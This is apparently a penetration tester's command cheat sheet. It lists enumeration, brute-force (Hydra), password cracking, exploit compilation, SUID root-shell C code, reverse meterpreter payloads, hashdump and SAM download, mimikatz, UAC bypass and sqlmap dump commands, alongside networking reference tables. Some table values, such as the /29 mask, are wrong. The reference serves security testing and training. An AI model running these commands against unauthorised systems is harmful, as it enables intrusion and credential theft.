## **Recon and Enumeration**
### **NMAP Commands**
Nmap (“Network Mapper”) is a free and open source utility for network discovery and security auditing. Many systems and network administrators also find it useful for tasks such as network inventory, managing service upgrade schedules, and monitoring host or service uptime. Nmap uses raw IP packets in novel ways to determine what hosts are available on the network, what services (application name and version) those hosts are offering, what operating systems (and OS versions) they are running, what type of packet filters/firewalls are in use, and dozens of other characteristics. It was designed to rapidly scan large networks, but works fine against single hosts. Nmap runs on all major computer operating systems, and official binary packages are available for Linux, Windows, and Mac OS X.


|**Command**|**Description**|
| :-: | :-: |
|nmap -v -sS -A -T4 target|Nmap verbose scan, runs syn stealth, T4 timing (should be ok on LAN), OS and service version info, traceroute and scripts against services|
|nmap -v -sS -p–A -T4 target|As above but scans all TCP ports (takes a lot longer)|
|nmap -v -sU -sS -p- -A -T4 target|As above but scans all TCP ports and UDP scan (takes even longer)|
|nmap -v -p 445 –script=smb-check-vulns<br>–script-args=unsafe=1 192.168.1.X|Nmap script to scan for vulnerable SMB servers – WARNING: unsafe=1 may cause knockover|
|nmap localhost|Displays all the ports that are currently in use|
|ls /usr/share/nmap/scripts/\* | grep ftp|Search nmap scripts for keywords|

## **SMB enumeration**
In computer networking, Server Message Block (SMB), one version of which was also known as Common Internet File System (CIFS, /ˈsɪfs/), operates as an application-layer network protocol mainly used for providing shared access to files, printers, and serial ports and miscellaneous communications between nodes on a network

|**Command**|**Description**|
| :-: | :-: |
|nbtscan 192.168.1.0/24|Discover Windows / Samba servers on subnet, finds Windows MAC addresses, netbios name and discover client workgroup / domain|
|enum4linux -a target-ip|Do Everything, runs all options (find windows client domain / workgroup) apart from dictionary based share name guessing|

### **Other Host Discovery**
Other methods of host discovery, that don’t use nmap…

|**Command**|**Description**|
| :-: | :-: |
|netdiscover -r 192.168.1.0/24|Discovers IP, MAC Address and MAC vendor on the subnet from ARP, helpful for confirming you’re on the right VLAN at $client site|

### **SMB Enumeration**
Enumerate Windows shares / Samba shares.

|**Command**|**Description**|
| :-: | :-: |
|nbtscan 192.168.1.0/24|Discover Windows / Samba servers on subnet, finds Windows MAC addresses, netbios name and discover client workgroup / domain|
|enum4linux -a target-ip|Do Everything, runs all options (find windows client domain / workgroup) apart from dictionary based share name guessing|

## **Python Local Web Server**
Python local web server command, handy for serving up shells and exploits on an attacking machine.

|**Command**|**Description**|
| :-: | :-: |
|python -m SimpleHTTPServer 80|Run a basic http server, great for serving up shells etc|

## **Mounting File Shares**
How to mount NFS / CIFS, Windows and Linux file shares.

|**Command**|**Description**|
| :-: | :-: |
|mount 192.168.1.1:/vol/share /mnt/nfs|Mount NFS share to /mnt/nfs|
|mount -t cifs -o username=user,password=pass<br>,domain=blah //192.168.1.X/share-name /mnt/cifs|Mount Windows CIFS / SMB share on Linux at /mnt/cifs if you remove password it will prompt on the CLI (more secure as it wont end up in bash\_history)|
|net use Z: \\win-server\share password<br>/user:domain\janedoe /savecred /p:no|Mount a Windows share on Windows from the command line|
|apt-get install smb4k -y|Install smb4k on Kali, useful Linux GUI for browsing SMB shares|

## **Basic FingerPrinting**
A device fingerprint or machine fingerprint or browser fingerprint is information collected about a remote computing device for the purpose of identification. Fingerprints can be used to fully or partially identify individual users or devices even when cookies are turned off.

|**Command**|**Description**|
| :-: | :-: |
|<p>nc -v 192.168.1.1 25</p><p>telnet 192.168.1.1 25</p>|Basic versioning / fingerprinting via displayed banner|

## **SNMP Enumeration**
SNMP enumeration is the process of using SNMP to enumerate user accounts on a target system. SNMP employs two major types of software components for communication: the SNMP agent, which is located on the networking device, and the SNMP management station, which communicates with the agent.

|**Command**|**Description**|
| :-: | :-: |
|<p>snmpcheck -t 192.168.1.X -c public</p><p>snmpwalk -c public -v1 192.168.1.X 1|<br>grep hrSWRunName|cut -d\* \* -f</p><p>snmpenum -t 192.168.1.X</p><p>onesixtyone -c names -i hosts</p>|SNMP enumeration|

## **DNS Zone Transfers**
|**Command**|**Description**|
| :-: | :-: |
|nslookup -> set type=any -> ls -d blah.com|Windows DNS zone transfer|
|dig axfr blah.com @ns1.blah.com|Linux DNS zone transfer|

## **DNSRecon**
DNSRecon provides the ability to perform:

1. Check all NS Records for Zone Transfers
1. Enumerate General DNS Records for a given Domain (MX, SOA, NS, A, AAAA, SPF and TXT)
1. Perform common SRV Record Enumeration. Top Level Domain (TLD) Expansion
1. Check for Wildcard Resolution
1. Brute Force subdomain and host A and AAAA records given a domain and a wordlist
1. Perform a PTR Record lookup for a given IP Range or CIDR
1. Check a DNS Server Cached records for A, AAAA and CNAME Records provided a list of host records in a text file to check
1. Enumerate Common mDNS records in the Local Network Enumerate Hosts and Subdomains using Google

` `DNS Enumeration Kali - DNSReconroot:~#

` `dnsrecon -d TARGET -D /usr/share/wordlists/dnsmap.txt -t std --xml ouput.xml

## **HTTP / HTTPS Webserver Enumeration**

|**Command**|**Description**|
| :-: | :-: |
|nikto -h 192.168.1.1|Perform a nikto scan against target|
|dirbuster|Configure via GUI, CLI input doesn’t work most of the time|

## **Packet Inspection**

|**Command**|**Description**|
| :-: | :-: |
|tcpdump tcp port 80 -w output.pcap -i eth0|tcpdump for port 80 on interface eth0, outputs to output.pcap|

## **Username Enumeration**
Some techniques used to remotely enumerate users on a target system.

### **SMB User Enumeration**

|**Command**|**Description**|
| :-: | :-: |
|python /usr/share/doc/python-impacket-doc/examples<br>/samrdump.py 192.168.XXX.XXX|Enumerate users from SMB|
|ridenum.py 192.168.XXX.XXX 500 50000 dict.txt|RID cycle SMB / enumerate users from SMB|

### **SNMP User Enumeration**

|**Command**|**Description**|
| :-: | :-: |
|snmpwalk public -v1 192.168.X.XXX 1 |grep 77.1.2.25<br>|cut -d” “ -f4|Enmerate users from SNMP|
|python /usr/share/doc/python-impacket-doc/examples/<br>samrdump.py SNMP 192.168.X.XXX|Enmerate users from SNMP|
|nmap -sT -p 161 192.168.X.XXX/254 -oG snmp\_results.txt<br>(then grep)|Search for SNMP servers with nmap, grepable output|

## **Passwords**

### **Wordlists**

|**Command**|**Description**|
| :-: | :-: |
|/usr/share/wordlists|Kali word lists|
Massive wordlist here at [HackToday’s blog](https://thehacktoday.com/password-cracking-dictionarys-download-for-free/)

## **Brute Forcing Services**

### **Hydra FTP Brute Force**
Hydra is a parallelized login cracker which supports numerous protocols to attack. It is very fast and flexible, and new modules are easy to add. This tool makes it possible for researchers and security consultants to show how easy it would be to gain unauthorized access to a system remotely. On Ubuntu it can be installed from the synaptic package manager. On Kali Linux, it is per-installed.

|**Command**|**Description**|
| :-: | :-: |
|hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f<br>192.168.X.XXX ftp -V|Hydra FTP brute force|

### **Hydra POP3 Brute Force**

|**Command**|**Description**|
| :-: | :-: |
|hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f<br>192.168.X.XXX pop3 -V|Hydra POP3 brute force|

### **Hydra SMTP Brute Force**

|**Command**|**Description**|
| :-: | :-: |
|hydra -P /usr/share/wordlistsnmap.lst 192.168.X.XXX smtp -V|Hydra SMTP brute force|
Use -t to limit concurrent connections, example: -t 15

## **Password Cracking**
### **John The Ripper – JTR**
John the Ripper is different from tools like Hydra. Hydra does blind brute-forcing by trying username/password combinations on a service daemon like ftp server or telnet server. John however needs the hash first. So the greater challenge for a hacker is to first get the hash that is to be cracked. Now a days hashes are more easily crackable using free rainbow tables available online. Just go to one of the sites, submit the hash and if the hash is made of a common word, then the site would show the word almost instantly. Rainbow tables basically store common words and their hashes in a large database. Larger the database, more the words covered.

|**Command**|**Description**|
| :-: | :-: |
|john –wordlist=/usr/share/wordlists/rockyou.txt hashes|JTR password cracking|
|john –format=descrypt –wordlist<br>/usr/share/wordlists/rockyou.txt hash.txt|JTR forced descrypt cracking with wordlist|
|john –format=descrypt hash –show|JTR forced descrypt brute force cracking|

## **Exploit Research**
Ways to find exploits for enumerated hosts / services.

|**Command**|**Description**|
| :-: | :-: |
|searchsploit windows 2003 | grep -i local|Search exploit-db for exploit, in this example windows 2003 + local esc|
|site:exploit-db.com exploit kernel <= 3|Use google to search exploit-db.com for exploits|
|grep -R “W7” /usr/share/metasploit-framework<br>/modules/exploit/windows/\*|Search metasploit modules using grep – msf search sucks a bit|

## **Compiling Exploits**

### **Identifying if C code is for Windows or Linux**
C #includes will indicate which OS should be used to build the exploit.

|**Command**|**Description**|
| :-: | :-: |
|process.h, string.h, winbase.h, windows.h, winsock2.h|Windows exploit code|
|arpa/inet.h, fcntl.h, netdb.h, netinet/in.h,<br>sys/sockt.h, sys/types.h, unistd.h|Linux exploit code|

### **Build Exploit GCC**
Compile exploit gcc.

|**Command**|**Description**|
| :-: | :-: |
|gcc -o exploit exploit.c|Basic GCC compile|

### **GCC Compile 32Bit Exploit on 64Bit Kali**
Handy for cross compiling 32 bit binaries on 64 bit attacking machines.

|**Command**|**Description**|
| :-: | :-: |
|gcc -m32 exploit.c -o exploit|Cross compile 32 bit binary on 64 bit Linux|

### **Compile Windows .exe on Linux**
Build / compile windows exploits on Linux, resulting in a .exe file.

|**Command**|**Description**|
| :-: | :-: |
|i586-mingw32msvc-gcc exploit.c -lws2\_32 -o exploit.exe|Compile windows .exe on Linux|

## **SUID Binary**
Often SUID C binary files are required to spawn a shell as a superuser, you can update the UID / GID and shell as required.

below are some quick copy and pate examples for various shells:

### **SUID C Shell for /bin/bash**
int main(void){

`       `setresuid(0, 0, 0);

`       `system("/bin/bash");

}
### **SUID C Shell for /bin/sh**
int main(void){

`       `setresuid(0, 0, 0);

`       `system("/bin/sh");

}

### **Building the SUID Shell binary**
gcc -o suid suid.c

For 32 bit:

gcc -m32 -o suid suid.c

## **TTY Shells**
Tips / Tricks to spawn a TTY shell from a limited shell in Linux, useful for running commands like su from reverse shells.

### **Python TTY Shell Trick**
python -c 'import pty;pty.spawn("/bin/bash")'

echo os.system('/bin/bash')

### **Spawn Interactive sh shell**
/bin/sh -i

### **Spawn Perl TTY Shell**
exec "/bin/sh";

perl —e 'exec "/bin/sh";'

### **Spawn Ruby TTY Shell**
exec "/bin/sh"

### **Spawn Lua TTY Shell**
os.execute('/bin/sh')

### **Spawn TTY Shell from Vi**
Run shell commands from vi:

:!bash

### **Spawn TTY Shell NMAP**
!sh

## **Metasploit**
Metasploit was created by H. D. Moore in 2003 as a portable network tool using Perl. By 2007, the Metasploit Framework had been completely rewritten in Ruby. On October 21, 2009, the Metasploit Project announced that it had been acquired by Rapid7, a security company that provides unified vulnerability management solutions.

Like comparable commercial products such as Immunity’s Canvas or Core Security Technologies’ Core Impact, Metasploit can be used to test the vulnerability of computer systems or to break into remote systems. Like many information security tools, Metasploit can be used for both legitimate and unauthorized activities. Since the acquisition of the Metasploit Framework, Rapid7 has added two open core proprietary editions called Metasploit Express and Metasploit Pro.

Metasploit’s emerging position as the de facto exploit development framework led to the release of software vulnerability advisories often accompanied by a third party Metasploit exploit module that highlights the exploitability, risk and remediation of that particular bug. Metasploit 3.0 began to include fuzzing tools, used to discover software vulnerabilities, rather than just exploits for known bugs. This avenue can be seen with the integration of the lorcon wireless (802.11) toolset into Metasploit 3.0 in November 2006. Metasploit 4.0 was released in August 2011.

### **Meterpreter Payloads**
### **Windows reverse meterpreter payload**

|**Command**|**Description**|
| :-: | :-: |
|set payload windows/meterpreter/reverse\_tcp|Windows reverse tcp payload|

### **Windows VNC Meterpreter payload**

|**Command**|**Description**|
| :-: | :-: |
|<p>set payload windows/vncinject/reverse\_tcp</p><p>set ViewOnly false</p>|Meterpreter Windows VNC Payload|

### **Linux Reverse Meterpreter payload**

|**Command**|**Description**|
| :-: | :-: |
|set payload linux/meterpreter/reverse\_tcp|Meterpreter Linux Reverse Payload|

## **Meterpreter Cheat Sheet**
Useful meterpreter commands.

|**Command**|**Description**|
| :-: | :-: |
|upload file c:\\windows|Meterpreter upload file to Windows target|
|download c:\\windows\\repair\\sam /tmp|Meterpreter download file from Windows target|
|download c:\\windows\\repair\\sam /tmp|Meterpreter download file from Windows target|
|execute -f c:\\windows\temp\exploit.exe|Meterpreter run .exe on target – handy for executing uploaded exploits|
|execute -f cmd -c|Creates new channel with cmd shell|
|ps|Meterpreter show processes|
|shell|Meterpreter get shell on the target|
|getsystem|Meterpreter attempts priviledge escalation the target|
|hashdump|Meterpreter attempts to dump the hashes on the target|
|portfwd add –l 3389 –p 3389 –r target|Meterpreter create port forward to target machine|
|portfwd delete –l 3389 –p 3389 –r target|Meterpreter delete port forward|

## **Common Metasploit Modules**
### **Remote Windows Metasploit Modules (exploits)**

|**Command**|**Description**|
| :-: | :-: |
|use exploit/windows/smb/ms08\_067\_netapi|MS08\_067 Windows 2k, XP, 2003 Remote Exploit|
|use exploit/windows/dcerpc/ms06\_040\_netapi|MS08\_040 Windows NT, 2k, XP, 2003 Remote Exploit|
|use exploit/windows/smb/<br>ms09\_050\_smb2\_negotiate\_func\_index|MS09\_050 Windows Vista SP1/SP2 and Server 2008 (x86) Remote Exploit|

### **Local Windows Metasploit Modules (exploits)**

|**Command**|**Description**|
| :-: | :-: |
|use exploit/windows/local/bypassuac|Bypass UAC on Windows 7 + Set target + arch, x86/64|

### **Auxilary Metasploit Modules**

|**Command**|**Description**|
| :-: | :-: |
|use auxiliary/scanner/http/dir\_scanner|Metasploit HTTP directory scanner|
|use auxiliary/scanner/http/jboss\_vulnscan|Metasploit JBOSS vulnerability scanner|
|use auxiliary/scanner/mssql/mssql\_login|Metasploit MSSQL Credential Scanner|
|use auxiliary/scanner/mysql/mysql\_version|Metasploit MSSQL Version Scanner|
|use auxiliary/scanner/oracle/oracle\_login|Metasploit Oracle Login Module|

### **Metasploit Powershell Modules**

|**Command**|**Description**|
| :-: | :-: |
|use exploit/multi/script/web\_delivery|Metasploit powershell payload delivery module|
|post/windows/manage/powershell/exec\_powershell|Metasploit upload and run powershell script through a session|
|use exploit/multi/http/jboss\_maindeployer|Metasploit JBOSS deploy|
|use exploit/windows/mssql/mssql\_payload|Metasploit MSSQL payload|

### **Post Exploit Windows Metasploit Modules**

|**Command**|**Description**|
| :-: | :-: |
|run post/windows/gather/win\_privs|Metasploit show privileges of current user|
|use post/windows/gather/credentials/gpp|Metasploit grab GPP saved passwords|
|load mimikatz -> wdigest|Metasplit load Mimikatz|
|run post/windows/gather/local\_admin\_search\_enum|Idenitfy other machines that the supplied domain user has administrative access to|

## **Networking**
### **TTL Fingerprinting**

|**Operating System**|**TTL Size**|
| :-: | :-: |
|Windows|128|
|Linux|64|
|Solaris|255|
|Cisco / Network|255|

## **IPv4**
### **Classful IP Ranges**
E.g Class A,B,C (depreciated)

|**Class**|**IP Address Range**|
| :-: | :-: |
|Class A IP Address Range|0.0.0.0 – 127.255.255.255|
|Class B IP Address Range|128.0.0.0 – 191.255.255.255|
|Class C IP Address Range|192.0.0.0 – 223.255.255.255|
|Class D IP Address Range|224.0.0.0 – 239.255.255.255|
|Class E IP Address Range|240.0.0.0 – 255.255.255.255|

### **IPv4 Private Address Ranges**

|**Class**|**Range**|
| :-: | :-: |
|Class A Private Address Range|10.0.0.0 – 10.255.255.255|
|Class B Private Address Range|172.16.0.0 – 172.31.255.255|
|Class C Private Address Range|192.168.0.0 – 192.168.255.255|
||127.0.0.0 – 127.255.255.255|

### **IPv4 Subnet Cheat Sheet**

|**CIDR**|**Decimal Mask**|**Number of Hosts**|
| :-: | :-: | :-: |
|/31|255.255.255.254|1 Host|
|/30|255.255.255.252|2 Hosts|
|/29|255.255.255.249|6 Hosts|
|/28|255.255.255.240|14 Hosts|
|/27|255.255.255.224|30 Hosts|
|/26|255.255.255.192|62 Hosts|
|/25|255.255.255.128|126 Hosts|
|/24|255.255.255.0|254 Hosts|
|/23|255.255.254.0|512 Host|
|/22|255.255.252.0|1022 Hosts|
|/21|255.255.248.0|2046 Hosts|
|/20|255.255.240.0|4094 Hosts|
|/19|255.255.224.0|8190 Hosts|
|/18|255.255.192.0|16382 Hosts|
|/17|255.255.128.0|32766 Hosts|
|/16|255.255.0.0|65534 Hosts|
|/15|255.254.0.0|131070 Hosts|
|/14|255.252.0.0|262142 Hosts|
|/13|255.248.0.0|524286 Hosts|
|/12|255.240.0.0|1048674 Hosts|
|/11|255.224.0.0|2097150 Hosts|
|/10|255.192.0.0|4194302 Hosts|
|/9|255.128.0.0|8388606 Hosts|
|/8|255.0.0.0|16777214 Hosts|

## **ASCII Table Cheat Sheet**
Useful for Web Application Penetration Testing, or if you get stranded on Mars and need to communicate with NASA.
|             |    |   |   |   |   |   |   |   |   |   |   |   |   |   |   |   |   |   |   |   |
|-------------|----|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|
|**ASCII**    |x00 |x08|x09|x0a|x0d|x1b|x20|x21|x22|x23|x24|x25|x26|x27|x28|x29|x2a|x2b|x2c|x2d|
|**Character**|Null|BS |TAB|LF |CR |ESC|SPC|!  |“  |#  |$  |%  |&  |`  |(  |)  |*  |+  |,  |–  |
|**ASCII**    |x2e |x2f|x30|x31|x32|x33|x34|x35|x36|x37|x38|x39|x3a|x3b|x3c|x3d|x3e|x3f|x40|   |
|**Character**|.   |/  |0  |1  |2  |3  |4  |5  |6  |7  |8  |9  |:  |;  |<  |=  |>  |?  |@  |   |
|**ASCII**    |x41 |x42|x43|x44|x45|x46|x47|x48|x49|x4a|x4b|x4c|x4d|x4e|x4f|x50|x51|x52|x53|x54|
|**Character**|A   |B  |C  |D  |E  |F  |G  |H  |I  |J  |K  |L  |M  |N  |O  |P  |Q  |R  |S  |T  |
|**ASCII**    |x55 |x56|x57|x58|x59|x5a|x5b|x5c|x5d|x5e|x5f|x60|x61|x62|x63|x64|x65|x66|x67|x68|
|**Character**|U   |V  |W  |X  |Y  |Z  |[  |\\ |]  |^  |_  |`  |a  |b  |c  |d  |e  |f  |g  |h  |
|**ASCII**    |x69 |x6a|x6b|x6c|x6d|x6e|x6f|x70|x71|x72|x73|x74|x75|x76|x77|x78|x79|x7a|   |   |
|**Character**|i   |j  |k  |l  |m  |n  |o  |p  |q  |r  |s  |t  |u  |v  |w  |x  |y  |z  |   |   |

## **CISCO IOS Commands**
A collection of useful Cisco IOS commands.

|**Command**|**Description**|
| :-: | :-: |
|enable|Enters enable mode|
|conf t|Short for, configure terminal|
|(config)# interface fa0/0|Configure FastEthernet 0/0|
|(config-if)# ip addr 0.0.0.0 255.255.255.255|Add ip to fa0/0|
|(config-if)# ip addr 0.0.0.0 255.255.255.255|Add ip to fa0/0|
|(config-if)# line vty 0 4|Configure vty line|
|(config-line)# login|Cisco set telnet password|
|(config-line)# password YOUR-PASSWORD|Set telnet password|
|# show running-config|Show running config loaded in memory|
|# show startup-config|Show sartup config|
|# show version|show cisco IOS version|
|# show session|display open sessions|
|# show ip interface|Show network interfaces|
|# show interface e0|Show detailed interface info|
|# show ip route|Show routes|
|# show access-lists|Show access lists|
|# dir file systems|Show available files|
|# dir all-filesystems|File information|
|# dir /all|SHow deleted files|
|# terminal length 0|No limit on terminal output|
|# copy running-config tftp|Copys running config to tftp server|
|# copy running-config startup-config|Copy startup-config to running-config|

## **Cryptography**
### **Hash Lengths**

|**Hash**|**Size**|
| :-: | :-: |
|MD5 Hash Length|16 Bytes|
|SHA-1 Hash Length|20 Bytes|
|SHA-256 Hash Length|32 Bytes|
|SHA-512 Hash Length|64 Bytes|

### **Hash Examples**
Likely just use hash-identifier for this but here are some example hashes:

|**Hash**|**Example**|
| :-: | :-: |
|MD5 Hash Example|8743b52063cd84097a65d1633f5c74f5|
|MD5 \$PASS:\$SALT Example|01dfae6e5d4d90d9892622325959afbe:7050461|
|MD5 \$SALT:\$PASS|f0fda58630310a6dd91a7d8f0a4ceda2:4225637426|
|SHA1 Hash Example|b89eaac7e61417341b710b727768294d0e6a277b|
|SHA1 \$PASS:\$SALT|2fc5a684737ce1bf7b3b239df432416e0dd07357:2014|
|SHA1 \$SALT:\$PASS|cac35ec206d868b7d7cb0b55f31d9425b075082b:5363620024|
|SHA-256|127e6fbfe24a750e72930c220a8e138275656b<br>8e5d8f48a98c3c92df2caba935|
|SHA-256 \$PASS:\$SALT|c73d08de890479518ed60cf670d17faa26a4a7<br>1f995c1dcc978165399401a6c4|
|SHA-256 \$SALT:\$PASS|eb368a2dfd38b405f014118c7d9747fcc97f4<br>f0ee75c05963cd9da6ee65ef498:560407001617|
|SHA-512|82a9dda829eb7f8ffe9fbe49e45d47d2dad9<br>664fbb7adf72492e3c81ebd3e29134d9bc<br>12212bf83c6840f10e8246b9db54a4<br>859b7ccd0123d86e5872c1e5082f|
|SHA-512 \$PASS:\$SALT|e5c3ede3e49fb86592fb03f471c35ba13e8<br>d89b8ab65142c9a8fdafb635fa2223c24e5<br>558fd9313e8995019dcbec1fb58414<br>6b7bb12685c7765fc8c0d51379fd|
|SHA-512 \$SALT:\$PASS|976b451818634a1e2acba682da3fd6ef<br>a72adf8a7a08d7939550c244b237c72c7d4236754<br>4e826c0c83fe5c02f97c0373b6b1<br>386cc794bf0d21d2df01bb9c08a|
|NTLM Hash Example|b4b9b02e6f09a9bd760f388b67351e2b|

## **SQLMap Examples**
sqlmap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers. It comes with a powerful detection engine, many niche features for the ultimate penetration tester and a broad range of switches lasting from database fingerprinting, over data fetching from the database, to accessing the underlying file system and executing commands on the operating system via out-of-band connections.

|**Command**|**Description**|
| :-: | :-: |
|sqlmap -u http://meh.com –forms –batch –crawl=10<br>–cookie=jsessionid=54321 –level=5 –risk=3|Automated sqlmap scan|
|sqlmap -u TARGET -p PARAM –data=POSTDATA –cookie=COOKIE<br>–level=3 –current-user –current-db –passwords<br>–file-read=”/var/www/blah.php”|Targeted sqlmap scan|
|sqlmap -u “http://meh.com/meh.php?id=1”<br>–dbms=mysql –tech=U –random-agent –dump|Scan url for union + error based injection with mysql backend<br>and use a random user agent + database dump|
|sqlmap -o -u “http://meh.com/form/” –forms|sqlmap check form for injection|
|sqlmap -o -u “http://meh/vuln-form” –forms<br>-D database-name -T users –dump|sqlmap dump and crack hashes for table users on database-name.|
